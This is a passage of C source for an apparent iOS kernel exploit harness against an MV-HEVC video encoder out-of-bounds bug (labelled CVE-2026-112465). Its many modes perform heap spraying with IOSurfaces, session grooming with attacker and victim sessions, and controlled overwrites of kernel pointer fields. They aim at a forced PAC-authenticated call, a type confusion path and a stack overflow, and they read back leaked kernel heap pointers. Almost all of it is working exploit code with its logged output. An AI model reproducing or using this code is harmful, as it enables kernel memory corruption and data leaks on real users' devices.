    } else if (strcmp(mode, "blraa") == 0) {
        rlog("BLRAA: 250 encodes with layer_id=1 to trigger forced BLRAA\n");
        rlog("WARNING: Entry 642 (+0x5F94) nonzero forces PAC-auth indirect call\n");
        rlog("This WILL cause a kernel panic if PAC check fails!\n\n");
        if (phase1_verify() != 0) goto done;
        phase5_firmware(250, 1);

    } else if (strcmp(mode, "read_only") == 0) {
        rlog("READ_ONLY: OOB read test only (400 encodes)\n\n");
        if (phase1_verify() != 0) goto done;
        phase4_oob_read(400);

    } else if (strcmp(mode, "spray") == 0) {
        rlog("SPRAY: IOSurface spray + cross-buffer test (400 encodes)\n\n");
        if (phase1_verify() != 0) goto done;
        phase6_spray(400);

    } else if (strcmp(mode, "firmware") == 0) {
        int lid = (argc > 2) ? atoi(argv[2]) : 0x4141;
        int enc = (argc > 3) ? atoi(argv[3]) : 220;
        rlog("FIRMWARE: %d encodes with layer_id=0x%x\n\n", enc, lid);
        if (phase1_verify() != 0) goto done;
        phase5_firmware(enc, lid);

    } else if (strcmp(mode, "simd_target") == 0) {
        rlog("SIMD_TARGET: Precisely target entries #630-633 (56-byte overwrite)\n");
        rlog("The LDP Q0,Q1 + LDR Q2 + LDR X8 at 0x1765bcc copies 56 bytes\n");
        rlog("from entries 630-633 to target object at encoder+0x5C70->offset 0x00-0x37\n");
        rlog("Plus ~32 bytes to target+0xFC and 4 bytes to target+0x118\n\n");
        rlog("This probe encodes EXACTLY 211 frames (633 entries = entry #632)\n");
        rlog("to overwrite the target object header with our controlled data.\n");
        rlog("layer_id values at entries 630-633 become bytes 4-7 of each 16-byte entry\n\n");
        rlog("Strategy: Use different layer_id values to identify which entry maps where\n\n");
        if (phase1_verify() != 0) goto done;
        rlog("--- Sub-test A: 211 encodes with layer_id=0x4141 (generic marker) ---\n");
        phase5_firmware(211, 0x4141);
        rlog("\n--- Sub-test B: 210 encodes (stop just before SIMD overwrite) ---\n");
        rlog("This is the SAFE baseline — entries reach 630 but not all 4 needed\n");
        phase5_firmware(210, 0x4242);
        rlog("\n--- Sub-test C: 215 encodes with layer_id=0xDEAD (past BLRAA trigger) ---\n");
        rlog("WARNING: Entry 642 (+0x5F94) will be nonzero with NAL_type (1-3)\n");
        rlog("If +0x5F94 triggers, BLRAA with PAC mismatch -> KERNEL PANIC likely\n");
        rlog("Comment out this test if 211 encodes already panics\n");
        phase5_firmware(215, 0xDEAD);

    } else if (strcmp(mode, "simd_safe") == 0) {
        int lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
        rlog("SIMD_SAFE: Exactly 210 encodes (stop BEFORE SIMD overwrite)\n");
        rlog("layer_id=0x%x, entries ~630 = at SIMD boundary but not complete\n", lid);
        rlog("This should be safe — the 56-byte copy needs entries 630-633\n\n");
        if (phase1_verify() != 0) goto done;
        phase5_firmware(210, lid);

    } else if (strcmp(mode, "cumsum_predict") == 0) {
        rlog("CUMSUM_PREDICT: Measure NAL sizes to predict cumsum at entry #593\n");
        rlog("+0x5C88 (SIMD target pointer) is at entry 593, byte offset 8 = cumsum\n");
        rlog("The cumsum value at entry 601 becomes the SIMD overwrite's target addr\n");
        rlog("If we can predict/control cumsum, we can redirect the 56-byte write\n\n");
        if (phase1_verify() != 0) goto done;
        rlog("Phase A: Detailed NAL measurement (20 encodes)\n\n");
        VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
        if (!s) goto done;
        size_t prev_bytes = 0;
        size_t total_nal_bytes = 0;
        int total_entries = 0;
        for (int i = 0; i < 20; i++) {
            int st = encode_one(s, i, 128, 128);
            size_t delta = g_last_pset_total_bytes - (i > 0 ? prev_bytes : 0);
            prev_bytes = g_last_pset_total_bytes;
            rlog("[%d] status=%d psets=%zu total_bytes=%zu delta=%zu\n",
                 i, st, g_last_pset_count, g_last_pset_total_bytes, delta);
            if (st != 0) break;
            total_entries += (int)g_last_pset_count;
            total_nal_bytes += delta;
        }
        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        usleep(500000);
        VTCompressionSessionInvalidate(s); CFRelease(s);
        rlog("\nTotal: %d entries from 20 encodes = %.1f entries/encode\n",
             total_entries, total_entries / 20.0);
        rlog("Total NAL bytes: %zu\n", total_nal_bytes);
        if (total_entries > 0) {
            double avg_nal = (double)total_nal_bytes / total_entries;
            double avg_cumsum_inc = avg_nal / 8.0;
            double cumsum_at_593 = avg_cumsum_inc * 593;
            rlog("Average NAL size: %.1f bytes\n", avg_nal);
            rlog("Average cumsum increment (data>>3): %.2f per entry\n", avg_cumsum_inc);
            rlog("PREDICTED cumsum at entry 592 (+0x5C70 ptr low32): %.0f (0x%x)\n",
                 avg_cumsum_inc * 592, (uint32_t)(avg_cumsum_inc * 592));
            rlog("PREDICTED cumsum at entry 593 (+0x5C88 ptr low32): %.0f (0x%x)\n",
                 cumsum_at_593, (uint32_t)cumsum_at_593);
            rlog("PREDICTED cumsum at entry 630 (+0x5ED4 SIMD src): %.0f (0x%x)\n",
                 avg_cumsum_inc * 630, (uint32_t)(avg_cumsum_inc * 630));
            rlog("PREDICTED cumsum at entry 642 (+0x5F94 dispatch): %.0f (0x%x)\n",
                 avg_cumsum_inc * 642, (uint32_t)(avg_cumsum_inc * 642));
            rlog("\nFor IOSurface spray targeting:\n");
            rlog("  kalloc.49152 addresses typically align to 0x1000 pages\n");
            rlog("  Spray IOSurfaces, note addresses, then predict which\n");
            rlog("  encode count places cumsum near a spray address\n");
        }

    } else if (strcmp(mode, "dual") == 0) {
        rlog("DUAL: Multi-session spray + cross-buffer OOB + victim trigger\n");
        rlog("Using STEREO ENCODE (pset=4 per encode, 1920x1080)\n");
        rlog("WARNING: Requires 270 encodes. Table 1 crash boundary is at ~148.\n");
        rlog("Run 'crash_test' first! If crash at 148, this mode will kernel panic.\n");
        rlog("Only proceed if crash_test proved 150+ encodes survive.\n\n");
        rlog("1. Create 20 MV-HEVC sessions (spray HEVC buffers in kalloc_data.49152)\n");
        rlog("2. Free alternating sessions to create holes\n");
        rlog("3. Create attacker + victim sessions in holes\n");
        rlog("4. Attacker encodes 270 frames -> cross-buffer OOB into victim +0x8\n");
        rlog("5. Victim encodes 1 frame -> corrupted loop bound -> stack overflow\n\n");
        if (phase1_verify() != 0) goto done;

        rlog("\n--- Phase A: Create 20 spray sessions ---\n");
        #define DUAL_SPRAY 20
        VTCompressionSessionRef spray_sessions[DUAL_SPRAY];
        for (int i = 0; i < DUAL_SPRAY; i++) {
            spray_sessions[i] = create_mvhevc_encoder(1920, 1080, 1);
            if (!spray_sessions[i]) {
                rlog("Session %d creation failed\n", i);
            } else {
                int st = encode_one_stereo(spray_sessions[i], 0, 1920, 1080);
                rlog("Session %d: created, first encode status=%d\n", i, st);
            }
        }

        rlog("\n--- Phase B: Free alternating sessions ---\n");
        for (int i = 0; i < DUAL_SPRAY; i += 2) {
            if (spray_sessions[i]) {
                VTCompressionSessionInvalidate(spray_sessions[i]);
                CFRelease(spray_sessions[i]);
                spray_sessions[i] = NULL;
                rlog("Freed session %d\n", i);
            }
        }
        usleep(100000);

        rlog("\n--- Phase C: Create attacker (lid=1) + victim (lid=1) ---\n");
        rlog("Note: layer_id forced to 1 for stereo encode (tags must match)\n");
        VTCompressionSessionRef attacker = create_mvhevc_encoder(1920, 1080, 1);
        VTCompressionSessionRef victim = create_mvhevc_encoder(1920, 1080, 1);
        if (!attacker || !victim) {
            rlog("FAILED to create attacker/victim\n");
            goto dual_cleanup;
        }
        int ast = encode_one_stereo(attacker, 0, 1920, 1080);
        int vst = encode_one_stereo(victim, 0, 1920, 1080);
        rlog("Attacker first encode: %d, Victim first encode: %d\n", ast, vst);

        rlog("\n--- Phase D: Attacker encodes 270 frames ---\n");
        rlog("Target: entry 1059+ (~265 enc) for cross-buffer OOB\n");
        int atk_errors = 0;
        for (int i = 1; i < 270; i++) {
            int st = encode_one_stereo(attacker, i, 1920, 1080);
            if (st != 0) {
                atk_errors++;
                rlog("[ATK %d] Error: %d\n", i, st);
                if (atk_errors >= 5) break;
            }
            if ((i+1) % 50 == 0 || i == 269) {
                int est = (i+1) * 4;
                rlog("[ATK %d/%d] ~%d entries, cross-buffer: %s\n",
                     i+1, 270, est, est > 1059 ? "REACHED" : "not yet");
            }
        }

        rlog("\n--- Phase E: Victim encodes 1 frame (may trigger stack overflow) ---\n");
        rlog("If victim +0x8 was corrupted to ~700, the loop at 0x1915168\n");
        rlog("runs 700 iterations × 256-byte format = stack overflow\n");
        rlog("Saved registers x19-x28 corrupted on stack\n");
        rlog("WARNING: This may cause a kernel panic!\n\n");
        vst = encode_one_stereo(victim, 1, 1920, 1080);
        rlog("Victim second encode: status=%d\n", vst);
        rlog("If we get here, either:\n");
        rlog("  a) Cross-buffer did not reach victim (not adjacent)\n");
        rlog("  b) Victim +0x8 was not corrupted to exploitable value\n");
        rlog("  c) Stack overflow was caught by guard page\n");
        rlog("  d) PAC failure on return address caused graceful error\n");

        rlog("\n--- Phase F: Check victim parameter sets for OOB data ---\n");
        rlog("Victim pset_count=%zu, pset_bytes=%zu\n",
             g_last_pset_count, g_last_pset_total_bytes);

        dual_cleanup:
        if (attacker) { VTCompressionSessionInvalidate(attacker); CFRelease(attacker); }
        if (victim) { VTCompressionSessionInvalidate(victim); CFRelease(victim); }
        for (int i = 0; i < DUAL_SPRAY; i++)
            if (spray_sessions[i]) {
                VTCompressionSessionInvalidate(spray_sessions[i]);
                CFRelease(spray_sessions[i]);
            }

    } else if (strcmp(mode, "table2_heap") == 0) {
        rlog("TABLE2_HEAP: Second VPS table OOB + IOSurface spray test\n");
        rlog("Both VPS tables overflow simultaneously during MV-HEVC encoding.\n");
        rlog("NOTE: Buffer is 0x9B10 bytes in 0xC000 kalloc.49152 allocation.\n");
        rlog("Table 2 OOB at 197 enc reaches +0xA2E4 — within allocation padding.\n");
        rlog("Cross-allocation needs 1057 entries (~352 enc) — past crash limit.\n");
        rlog("This test checks: a) if table 2 OOB corrupts driver state at +0x8DF4-0x9B10\n");
        rlog("  b) if IOSurface spray lands in adjacent allocation (observable via readback)\n");
        rlog("Table 1 hits +0x5C70 at entry 592 → crash at ~197 encodes.\n\n");
        if (phase1_verify() != 0) goto done;

        int t2_encodes = (argc > 2) ? atoi(argv[2]) : 170;
        int t2_lid = (argc > 3) ? (int)strtol(argv[3], NULL, 0) : 0x4141;
        if (t2_encodes > 195) {
            rlog("WARNING: >195 encodes risks table 1 +0x5C70 crash at ~197!\n");
            rlog("Clamping to 195.\n");
            t2_encodes = 195;
        }

        rlog("--- Step 1: Pre-spray %d IOSurfaces ---\n", SPRAY_COUNT/2);
        for (int i = 0; i < SPRAY_COUNT/2; i++)
            g_surfaces[i] = create_spray_surface(i);

        rlog("--- Step 2: Create MV-HEVC encoder (lid=0x%x, 1920x1080 stereo) ---\n", t2_lid);
        VTCompressionSessionRef t2s = create_mvhevc_encoder(1920, 1080, t2_lid);
        if (!t2s) {
            rlog("FAILED: Could not create encoder\n");
            for (int i = 0; i < SPRAY_COUNT/2; i++)
                if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
            goto done;
        }

        rlog("--- Step 3: Post-spray %d more IOSurfaces ---\n", SPRAY_COUNT/2);
        for (int i = SPRAY_COUNT/2; i < SPRAY_COUNT; i++)
            g_surfaces[i] = create_spray_surface(i);

        rlog("--- Step 4: Encode %d frames (stereo, pset=4, table 2 heap overflow at ~117) ---\n", t2_encodes);
        int t2_errors = 0;
        for (int i = 0; i < t2_encodes; i++) {
            int st = encode_one_stereo(t2s, i, 1920, 1080);
            if (st != 0) {
                t2_errors++;
                rlog("[%d] Error: %d\n", i, st);
                if (t2_errors >= 5) break;
            }
            if ((i+1) % 25 == 0 || i == t2_encodes-1) {
                int t1_entries = (i+1) * 4;
                int t2_entries = (i+1) * 4;
                const char *t1_state = "pre-OOB";
                if (t1_entries >= 592) t1_state = "DANGER: +0x5C70 hit!";
                else if (t1_entries >= 256) t1_state = "OOB (safe range)";
                const char *t2_state = "pre-OOB";
                if (t2_entries >= 466) t2_state = "ALLOC PADDING OOB (not cross-alloc)";
                else if (t2_entries >= 256) t2_state = "intra-buffer OOB";
                rlog("[%d/%d] T1: ~%d entries (%s) | T2: ~%d entries (%s)\n",
                     i+1, t2_encodes, t1_entries, t1_state, t2_entries, t2_state);
            }
        }

        VTCompressionSessionCompleteFrames(t2s, kCMTimeInvalid);
        usleep(500000);

        rlog("\n--- Step 5: Check spray surfaces for corruption ---\n");
        int t2_corrupted = 0;
        for (int i = 0; i < SPRAY_COUNT; i++) {
            if (!g_surfaces[i]) continue;
            IOSurfaceLock(g_surfaces[i], 1, NULL);
            void *base = IOSurfaceGetBaseAddress(g_surfaces[i]);
            if (base) {
                uint32_t *p32 = (uint32_t *)base;
                int changes = 0;
                for (int j = 2; j < 9216; j++) {
                    if (p32[j] != 0xAAAAAAAA) {
                        if (!changes) {
                            rlog("  SURFACE[%d] CORRUPTED at +0x%x: 0x%08x\n",
                                 i, j*4, p32[j]);
                            for (int k = (j>2?j-2:0); k < j+8 && k < 9216; k++)
                                rlog("    [+0x%04x] 0x%08x%s\n", k*4, p32[k],
                                     p32[k] != 0xAAAAAAAA ? " *" : "");
                        }
                        changes++;
                    }
                }
                if (changes) {
                    t2_corrupted++;
                    rlog("  Surface[%d]: %d words changed\n", i, changes);
                }
            }
            IOSurfaceUnlock(g_surfaces[i], 1, NULL);
        }

        rlog("\nCorrupted surfaces: %d / %d\n", t2_corrupted, SPRAY_COUNT);
        if (t2_corrupted > 0) {
            rlog("*** TABLE 2 HEAP OVERFLOW INTO ADJACENT IOSurface CONFIRMED ***\n");
            rlog("*** layer_id=0x%x values should appear at byte position 4 ***\n", t2_lid);
        } else {
            rlog("No corruption detected. Possible reasons:\n");
            rlog("  - HEVC buffer not adjacent to any spray surface\n");
            rlog("  - Table 2 not written during MV-HEVC (needs on-device verification)\n");
            rlog("  - Entries per encode differ from expected ~3\n");
        }

        VTCompressionSessionInvalidate(t2s); CFRelease(t2s);
        for (int i = 0; i < SPRAY_COUNT; i++)
            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }

    } else if (strcmp(mode, "crash_test") == 0) {
        rlog("CRASH_TEST: Incrementally encode to find the ACTUAL crash boundary\n");
        rlog("Using STEREO ENCODE (pset=4 per encode, 1920x1080)\n");
        rlog("Known pointer fields in OOB range (may crash when overwritten):\n");
        rlog("  Entry 274 (+0x4890, ~69 enc): 64-bit pointer, used in struct setup\n");
        rlog("  Entry 297 (+0x4A00, ~75 enc): 5 refs, heavily used field\n");
        rlog("  Entry 421 (+0x51C8, ~106 enc): pointer chain walk dereference\n");
        rlog("  Entry 536 (+0x58F8, ~134 enc): LDR X1 → DEREF [X1+0] and [X1+0x28]\n");
        rlog("  Entry 579 (+0x5BA0, ~145 enc): passed as arg0 to function call\n");
        rlog("  Entry 592 (+0x5C70, ~148 enc): SIMD copy target pointer\n");
        rlog("Strategy: batch to 63 (pre-OOB), then one-at-a-time through danger zones.\n\n");
        if (phase1_verify() != 0) goto done;
        int ct_lid = 1;
        rlog("layer_id=0x%x (forced to 1 for stereo — tags must match session config)\n", ct_lid);
        VTCompressionSessionRef ct_s = create_mvhevc_encoder(1920, 1080, ct_lid);
        if (!ct_s) { rlog("FAILED: encoder creation\n"); goto done; }
        rlog("Phase A: Pre-OOB baseline (63 encodes, ~252 entries)\n");
        for (int i = 0; i < 63; i++) {
            int st = encode_one_stereo(ct_s, i, 1920, 1080);
            if (st != 0) { rlog("[%d] ENCODE ERROR: %d (pre-OOB!)\n", i, st); break; }
            if ((i+1) % 20 == 0) rlog("[%d] ok, ~%d entries\n", i+1, (i+1)*4);
        }
        rlog("\nPhase B: OOB region, one encode at a time (63-160)\n");
        rlog("Watching for crashes at pointer field boundaries.\n\n");
        for (int i = 63; i < 160; i++) {
            int entries = (i+1)*4;
            const char *zone = "";
            if (entries >= 592) zone = " [+0x5C70 SIMD ptr]";
            else if (entries >= 579) zone = " [+0x5BA0 func ptr]";
            else if (entries >= 536) zone = " [+0x58F8 deref ptr]";
            else if (entries >= 421) zone = " [+0x51C8 chain walk]";
            else if (entries >= 297) zone = " [+0x4A00 heavy use]";
            else if (entries >= 274) zone = " [+0x4890 struct ptr]";
            else if (entries >= 256) zone = " [OOB started]";
            rlog("[%d] entries ~%d (+0x%x)%s... ",
                 i, entries, 0x3770 + entries*16, zone);
            fflush(stdout);
            int st = encode_one_stereo(ct_s, i, 1920, 1080);
            if (st != 0) {
                rlog("ERROR %d\n", st);
                rlog("*** CRASH BOUNDARY: encode %d (entries ~%d) ***\n", i, entries);
                rlog("*** Last safe encode: %d (entries ~%d) ***\n", i-1, (i)*4);
                break;
            }
            rlog("OK\n");
            if (i == 68) {
                rlog("  → Survived entry 276 (+0x4890) overwrite\n");
            } else if (i == 74) {
                rlog("  → Survived entry 300 (+0x4A00) overwrite\n");
            } else if (i == 105) {
                rlog("  → Survived entry 424 (+0x51C8) overwrite\n");
            } else if (i == 133) {
                rlog("  → Survived entry 536 (+0x58F8) overwrite — pointer deref field OK\n");
            } else if (i == 144) {
                rlog("  → Survived entry 580 (+0x5BA0) overwrite — func ptr field OK\n");
            } else if (i == 147) {
                rlog("*** ENCODE 148 SURVIVED — entry 592 (+0x5C70) written without crash ***\n");
                rlog("*** Scenario B confirmed: SIMD/BLRAA/type_confusion all REACHABLE ***\n");
            } else if (i == 150) {
                rlog("*** ENCODE 151 SURVIVED — entries 604+ viable ***\n");
            }
        }
        VTCompressionSessionCompleteFrames(ct_s, kCMTimeInvalid);
        usleep(500000);
        VTCompressionSessionInvalidate(ct_s); CFRelease(ct_s);

    } else if (strcmp(mode, "blraa_boundary") == 0) {
        rlog("BLRAA_BOUNDARY: Encode to entry 639 (just before BLRAA trigger at 642)\n");
        rlog("Entry 642 (+0x5F94) byte 4 = layer_id controls BLRAA trigger.\n");
        rlog("Entry 640 is +0x5F74, entry 641 is +0x5F84, entry 642 is +0x5F94.\n");
        rlog("This probe encodes ~213 frames (639 entries) to measure behavior\n");
        rlog("at the BLRAA boundary WITHOUT triggering the forced call.\n\n");
        rlog("Strategy: If 213 encodes survive, the firmware data at +0x5F94\n");
        rlog("was originally zero (normal path, no BLRAA). If it panics earlier,\n");
        rlog("then the memcpy firmware data at +0x5F94 was already nonzero.\n\n");
        int bb_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
        rlog("layer_id=0x%x, targeting 213 encodes (639 entries)\n\n", bb_lid);
        if (phase1_verify() != 0) goto done;
        phase5_firmware(213, bb_lid);
        rlog("\nIf we survived 213 encodes: BLRAA trigger at +0x5F94 is likely zero.\n");
        rlog("Safe to attempt 214 encodes (entry 642) with controlled layer_id.\n");
        rlog("The BLRAA will fire using whatever function pointer is at the call site.\n");

    } else if (strcmp(mode, "type_confusion") == 0) {
        rlog("TYPE_CONFUSION: Target value==2 dispatch via +0x5F94 (entry 642)\n");
        rlog("Per BLRAA path analysis: layer_id at +0x5F94 controls 3-way dispatch:\n");
        rlog("  0 or >=3: skip (safe default)\n");
        rlog("  1: BLRAA vtable[0x188](self, 4) — real call\n");
        rlog("  2: 5-level chain walk → type confusion processing\n");
        rlog("Value==2 passes buffer+0x5F98 (OUR OOB DATA) as kernel-valid pointer\n");
        rlog("to vtable methods. NO PAN issue (pointer is in kernel heap).\n");
        rlog("Data interpreted as HEVC params but actually contains our controlled values.\n\n");
        rlog("REQUIRES: crash_test survival past 214 encodes (Scenario B)!\n");
        rlog("WARNING: If crash at 197, this WILL kernel panic!\n\n");
        if (phase1_verify() != 0) goto done;

        int tc_target_lid = 2;
        int tc_encodes = (argc > 2) ? atoi(argv[2]) : 215;
        rlog("Target: %d encodes, layer_id=%d on all entries\n", tc_encodes, tc_target_lid);
        rlog("Entry 642 (+0x5F94) layer_id byte gets value %d → triggers chain walk\n\n",
             tc_target_lid);

        VTCompressionSessionRef tc_s = create_mvhevc_encoder(128, 128, tc_target_lid);
        if (!tc_s) { rlog("FAILED: encoder creation\n"); goto done; }

        rlog("Phase A: Safe range (190 encodes)\n");
        for (int i = 0; i < 190; i++) {
            int st = encode_one(tc_s, i, 128, 128);
            if (st != 0) { rlog("[%d] ENCODE ERROR: %d\n", i, st); break; }
            if ((i+1) % 50 == 0) rlog("[%d] ok\n", i+1);
        }

        rlog("\nPhase B: Approach crash boundary (190-199)\n");
        for (int i = 190; i < 200; i++) {
            rlog("[%d] encoding (entries ~%d, offset +0x%x)... ",
                 i, i*3, 0x3770 + i*3*16);
            int st = encode_one(tc_s, i, 128, 128);
            if (st != 0) {
                rlog("ERROR %d — crash boundary hit\n", st);
                rlog("*** Scenario A confirmed: entries 592+ UNREACHABLE ***\n");
                rlog("*** Type confusion path BLOCKED ***\n");
                goto tc_done;
            }
            rlog("OK\n");
        }
        rlog("*** Survived entry 592+ — Scenario B confirmed! ***\n\n");

        rlog("Phase C: Push to BLRAA trigger (200-%d)\n", tc_encodes);
        for (int i = 200; i < tc_encodes; i++) {
            rlog("[%d] encoding (entries ~%d)... ", i, i*3);
            int st = encode_one(tc_s, i, 128, 128);
            if (st != 0) {
                rlog("ERROR %d\n", st);
                rlog("*** Encode %d failed — crash at entry ~%d ***\n", i, i*3);
                break;
            }
            rlog("OK\n");
            if (i == 213) {
                rlog("*** ENCODE 214 SURVIVED — entry 642 (+0x5F94) written ***\n");
                rlog("*** layer_id=2 placed at dispatch site ***\n");
                rlog("*** Next encode/finalize may trigger 5-level chain walk ***\n");
            }
        }

        rlog("\nPhase D: Finalize (triggers dispatch if entry 642 is processed)\n");
        VTCompressionSessionCompleteFrames(tc_s, kCMTimeInvalid);
        usleep(500000);
        rlog("CompleteFrames returned — session finalized\n");
        rlog("If we survived: dispatch path was either:\n");
        rlog("  a) Not reached during finalize (needs different trigger)\n");
        rlog("  b) Chain walk hit zero sub-branch → data processed silently\n");
        rlog("Check crash logs for any PAC/PAN faults.\n");

tc_done:
        VTCompressionSessionInvalidate(tc_s); CFRelease(tc_s);

    } else if (strcmp(mode, "safe_max") == 0) {
        rlog("SAFE_MAX: Maximum safe encodes (196) with corruption check\n");
        rlog("Entry 591 (~197 enc) is the last safe entry before +0x5C70 crash\n");
        rlog("This maximizes OOB corruption without triggering pointer crash\n\n");
        int sm_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
        rlog("layer_id=0x%x, 196 encodes\n\n", sm_lid);
        if (phase1_verify() != 0) goto done;
        phase5_firmware(196, sm_lid);

    } else if (strcmp(mode, "pset_dump") == 0) {
        rlog("PSET_DUMP: Stereo OOB read test (CVE-2026-112465)\n");
        rlog("Uses MV-HEVC stereo encoding to inflate VPS table counter,\n");
        rlog("then probes CMVideoFormatDescriptionGetHEVCParameterSetAtIndex\n");
        rlog("at indices beyond baseline to detect kernel heap data leak.\n");
        rlog("Kernel pointer pattern on A20 iOS 27.1: 0xfffffe00XXXXXXXX\n\n");
        int encodes = (argc > 2) ? atoi(argv[2]) : 100;
        int probe_max = (argc > 3) ? atoi(argv[3]) : 20;
        if (phase1_verify() != 0) goto done;

        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
        if (!s) goto done;

        /* Record baseline pset count from first stereo encode */
        encode_one_stereo(s, 0, 1920, 1080);
        size_t baseline_count = g_last_pset_count;
        size_t baseline_bytes = g_last_pset_total_bytes;
        rlog("Baseline: pset_count=%zu, pset_bytes=%zu\n", baseline_count, baseline_bytes);

        rlog("Encoding %d stereo frames to inflate counter...\n", encodes);
        int errors = 0;
        for (int i = 1; i < encodes; i++) {
            int st = encode_one_stereo(s, i, 1920, 1080);
            if (st != 0) { errors++; if (errors < 5) rlog("[%d] Error: %d\n", i, st); }
            if ((i+1) % 25 == 0) {
                size_t est = (size_t)(i+1) * g_last_pset_count;
                rlog("[%d/%d] psets=%zu bytes=%zu est_entries=%zu%s\n",
                     i+1, encodes, g_last_pset_count, g_last_pset_total_bytes,
                     est, est >= 256 ? " OOB" : "");
            }
        }
        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        usleep(500000);

        /* Final encode — the callback saves g_saved_fmt */
        rlog("\nFinal stereo encode to capture format description...\n");
        encode_one_stereo(s, encodes, 1920, 1080);
        rlog("Post-overflow: pset_count=%zu, pset_bytes=%zu (errors=%d)\n",
             g_last_pset_count, g_last_pset_total_bytes, errors);

        /* KEY TEST 1: Did pset_count increase? */
        if (g_last_pset_count > baseline_count) {
            rlog("\n*** COUNTER INFLATED: pset_count grew from %zu to %zu ***\n",
                 baseline_count, g_last_pset_count);
            rlog("This confirms the kernel VPS table counter accumulates!\n");
        } else {
            rlog("\npset_count unchanged at %zu (user-space API may normalize)\n",
                 g_last_pset_count);
        }

        /* KEY TEST 2: Did pset total bytes increase? */
        if (g_last_pset_total_bytes > baseline_bytes) {
            rlog("*** BYTES INFLATED: pset_bytes grew from %zu to %zu ***\n",
                 baseline_bytes, g_last_pset_total_bytes);
        }

        /* Dump all reported parameter sets */
        rlog("\n--- REPORTED PARAMETER SETS ---\n");
        dump_psets(g_saved_fmt, baseline_count);

        /* KEY TEST 3: Probe BEYOND reported count (OOB read) */
        rlog("\n--- OOB READ PROBE (indices %zu..%zu) ---\n",
             baseline_count, baseline_count + (size_t)probe_max - 1);
        rlog("If kernel counter is inflated, reads at index >= %zu\n", baseline_count);
        rlog("should succeed and return OOB kernel heap data.\n\n");
        int oob_found = 0;
        for (size_t i = baseline_count; i < baseline_count + (size_t)probe_max; i++) {
            const uint8_t *ptr = NULL;
            size_t sz = 0;
            int nal_hdr = 0;
            OSStatus pst = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                g_saved_fmt, i, &ptr, &sz, NULL, &nal_hdr);
            if (pst == 0 && ptr && sz > 0) {
                oob_found++;
                rlog("  [%zu] *** OOB READ OK *** nal=%d size=%zu\n", i, nal_hdr, sz);
                size_t dump_len = (sz > 128) ? 128 : sz;
                rlog("    ");
                for (size_t j = 0; j < dump_len; j++) {
                    rlog("%02x", ptr[j]);
                    if ((j+1) % 32 == 0) rlog("\n    ");
                    else if ((j+1) % 8 == 0) rlog(" ");
                }
                rlog("\n");
                if (sz >= 8) {
                    for (size_t j = 0; j <= sz - 8; j += 4) {
                        uint64_t qw = *(const uint64_t *)(ptr + j);
                        if ((qw >> 40) == 0xfffffe) {
                            rlog("    *** KERNEL PTR at byte %zu: 0x%016llx ***\n",
                                 j, (unsigned long long)qw);
                        }
                    }
                }
            } else if (pst == 0) {
                rlog("  [%zu] returned OK but ptr=%p sz=%zu (empty)\n", i, (void*)ptr, sz);
            } else {
                rlog("  [%zu] error=%d (expected if counter not inflated)\n", i, (int)pst);
                if (i == baseline_count) {
                    rlog("  First OOB probe failed — counter likely resets per-encode\n");
                    rlog("  or user-space API clamps to real count.\n");
                    break;
                }
            }
        }

        if (oob_found > 0) {
            rlog("\n*** SUCCESS: %d OOB reads returned data = KERNEL HEAP LEAK ***\n", oob_found);
            rlog("CVE-2026-112465 OOB read is CONFIRMED and EXPLOITABLE.\n");
        } else {
            rlog("\nNo OOB data via parameter set readback.\n");
            rlog("Possible: (a) kernel counter resets per encode for stereo,\n");
            rlog("(b) user-space API clamps index to real count,\n");
            rlog("(c) OOB read needs different readback path.\n");
        }

        VTCompressionSessionInvalidate(s); CFRelease(s);
        if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }

    } else if (strcmp(mode, "stereo_keyframe") == 0) {
        rlog("STEREO_KEYFRAME: Force-keyframe counter accumulation test\n");
        rlog("Every frame forced to IDR keyframe via kVTEncodeFrameOptionKey_ForceKeyFrame.\n");
        rlog("This ensures VPS/SPS/PPS NAL units are emitted on EVERY encode,\n");
        rlog("not just periodic GOP keyframes. If the kernel VPS table counter\n");
        rlog("accumulates, we should see a crash at ~64 encodes (entry 256).\n\n");
        int encodes = (argc > 2) ? atoi(argv[2]) : 70;
        if (phase1_verify() != 0) goto done;

        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
        if (!s) goto done;

        size_t baseline_bytes = 0;
        int errors = 0;
        int bytes_changed = 0;
        for (int i = 0; i < encodes; i++) {
            int st = encode_one_stereo_kf(s, i, 1920, 1080, 1, 1);
            if (i == 0) {
                baseline_bytes = g_last_pset_total_bytes;
                rlog("Baseline: pset_count=%zu, bytes=%zu (all frames forced keyframe)\n",
                     g_last_pset_count, baseline_bytes);
            }
            if (st != 0) {
                errors++;
                rlog("[%d] ENCODE ERROR: %d\n", i, st);
                if (errors >= 5) { rlog("Too many errors, stopping\n"); break; }
            }
            if (g_last_pset_total_bytes != baseline_bytes && !bytes_changed) {
                bytes_changed = 1;
                rlog("[%d] *** PSET BYTES CHANGED: %zu -> %zu ***\n",
                     i, baseline_bytes, g_last_pset_total_bytes);
                rlog("This indicates intra-buffer corruption from counter overflow!\n");
            }
            if ((i+1) % 10 == 0 || i == encodes-1) {
                size_t est = (size_t)(i+1) * g_last_pset_count;
                rlog("[%d/%d] psets=%zu bytes=%zu est_entries=%zu%s err=%d\n",
                     i+1, encodes, g_last_pset_count, g_last_pset_total_bytes,
                     est, est >= 256 ? " ***OOB***" : "", errors);
            }
        }

        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        usleep(500000);
        VTCompressionSessionInvalidate(s); CFRelease(s);

        if (bytes_changed)
            rlog("\n*** PSET BYTES CHANGED during encoding — counter IS accumulating ***\n");
        else if (errors == 0 && encodes >= 64)
            rlog("\n%d keyframe encodes completed with no crash and stable pset bytes.\n"
                 "If est_entries > 256 but no crash, counter may reset per keyframe,\n"
                 "or VPS table entries only accumulate on NON-keyframe encodes.\n", encodes);
        else
